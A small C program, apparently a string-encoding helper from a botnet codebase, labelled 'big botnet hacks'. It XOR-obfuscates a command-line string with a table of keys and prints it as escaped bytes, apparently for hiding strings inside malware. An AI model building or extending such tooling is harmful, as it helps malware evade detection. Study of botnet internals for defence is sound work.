#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <stdint.h>
#include <string.h>

/* lalalala big botnet hacks */
uint32_t table_keys[] = {0x4a3fbc11, 0x473f10cd, 0x1666062, 0x7fd16bb1, 0x5d1b42e5, 0x5f774ead, 0x797fc30b, 0x7f4f8f9b, 0x7086ce4f, 0x6f9b6243, 0x5d5633c7, 0x34eae36d, 0x57374239, 0x72aa80d3, 0x3f4b24a2, 0x7d28eaf8, 0x1b37ff65, 0x7188758f, 0x889722d, 0x6d53d2c2};

#define TABLE_KEY_LEN (sizeof(table_keys) / sizeof(*table_keys))

void add_entry(char *buf, int buf_len) {
    char *cpy = malloc(buf_len + 1);
    strcpy(cpy, buf);

    for (int i = 0; i < TABLE_KEY_LEN; i++) {
        uint32_t table_key = table_keys[i];

        uint8_t k1 = table_key & 0xff,
                k2 = (table_key >> 8) & 0xff,
                k3 = (table_key >> 16) & 0xff,
                k4 = (table_key >> 24) & 0xff;


        for (int i = 0; i < buf_len; i++) {
            cpy[i] ^= k1;
            cpy[i] ^= k2;
            cpy[i] ^= k3;
            cpy[i] ^= k4;
        }
    }

    printf("XOR'd %d bytes: '", buf_len);

    for (int i = 0; i < buf_len; i++) {
        printf("\\x%x", (uint8_t)cpy[i]);
    }
    puts("'");
}

/* HUH */
int main(int argc, char **args) {
    add_entry(args[1], strlen(args[1]));
}
